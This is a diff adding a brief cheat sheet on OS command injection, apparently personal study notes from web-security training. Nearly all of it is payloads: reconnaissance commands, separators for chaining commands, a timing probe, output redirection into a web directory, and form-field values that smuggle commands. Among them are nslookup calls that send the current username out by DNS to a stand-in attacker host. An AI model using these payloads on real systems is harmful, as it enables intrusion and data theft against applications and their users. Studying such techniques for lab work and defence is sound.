@@ -1,0 +1,20 @@
+useful command for injection
+Purpose of command 	Linux 		Windows
+Name of current user 	whoami 		whoami
+Operating system 	uname -a 	ver
+Network configuration 	ifconfig 	ipconfig /all
+Network connections 	netstat -an 	netstat -an
+Running processes 	ps -ef 		tasklist 
+to recognize blind os command injection use 
+& ping -c 10 127.0.0.1 & 
+from time delay of application respond you can undrestand os command injection vulnerability 
+Exploiting blind OS command injection by redirecting output
+& whoami > /var/www/static/whoami.txt &
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+ways of perform attack:
+&
+&&
+|
+||
+email=x||ping+-c+10+127.0.0.1||
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
